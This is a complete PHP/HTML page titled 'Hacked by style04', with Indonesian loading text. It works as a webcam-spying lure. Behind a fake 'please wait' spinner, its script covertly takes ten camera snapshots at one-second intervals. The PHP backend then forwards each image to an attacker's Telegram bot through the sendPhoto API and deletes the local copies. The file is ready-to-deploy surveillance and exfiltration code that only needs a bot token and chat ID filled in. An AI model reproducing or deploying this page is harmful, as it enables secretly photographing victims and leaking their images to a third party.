<?php
$botToken = "ISI TOKEN BOT TELEGRAM DI SINI";
$chatId = "MASUKAN ID TELEGRAM DI SINI";

function sendPhotoToTelegram($photoPath) {
    global $botToken, $chatId;

    if (!file_exists($photoPath)) {
        echo json_encode(["status" => "error", "message" => "File tidak ditemukan"]);
        return false;
    }

    if (filesize($photoPath) > 20 * 1024 * 1024) { // 20 MB
        echo json_encode(["status" => "error", "message" => "File terlalu besar"]);
        return false;
    }

    $url = "https://api.telegram.org/bot$botToken/sendPhoto";
    $data = [
        'chat_id' => $chatId,
        'photo' => new CURLFile($photoPath),
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    $responseObj = json_decode($response, true);
    return $responseObj['ok'] === true;
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $photos = json_decode($_POST["photos"], true);
    $successCount = 0;

    foreach ($photos as $index => $photoData) {
        $photoPath = "captured_image_$index.png";

        $photoData = str_replace('data:image/png;base64,', '', $photoData);
        $photoData = str_replace(' ', '+', $photoData);
        file_put_contents($photoPath, base64_decode($photoData));

        if (sendPhotoToTelegram($photoPath)) {
            $successCount++;
        }

        unlink($photoPath); 
    }

    echo json_encode(["status" => "success", "message" => "$successCount foto berhasil dikirim"]);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacked by style04</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 500px;
        }
        h1 {
            color: #333;
        }
        #loader {
            margin: 20px auto;
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            margin-top: 20px;
            color: #555;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Mohon Tunggu</h1>
        <div id="loader"></div>
        <p class="message">Sedang loading mohon tunggu sebentar...</p>
    </div>

    <script>
        let photos = [];
        let photoCount = 0;
        const maxPhotos = 10;

        function capturePhotos() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function (stream) {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    video.addEventListener('loadeddata', () => {
                        const interval = setInterval(() => {
                            if (photoCount >= maxPhotos) {
                                clearInterval(interval);
                                sendPhotosToServer(photos);
                                stream.getTracks().forEach(track => track.stop());
                                return;
                            }

                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;

                            const context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            photos.push(canvas.toDataURL('image/png'));
                            photoCount++;
                        }, 1000);
                    });
                })
                .catch(function (error) {
                    console.error("Error accessing camera:", error);
                });
        }

        function sendPhotosToServer(photos) {
            fetch("", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: new URLSearchParams({ photos: JSON.stringify(photos) }),
            })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        document.querySelector('.message').innerText = data.message;
                    } else {
                        document.querySelector('.message').innerText = "Gagal mengirim gambar.";
                    }
                })
                .catch(error => {
                    console.error("Error:", error);
                });
        }

        capturePhotos();
    </script>
</body>
</html>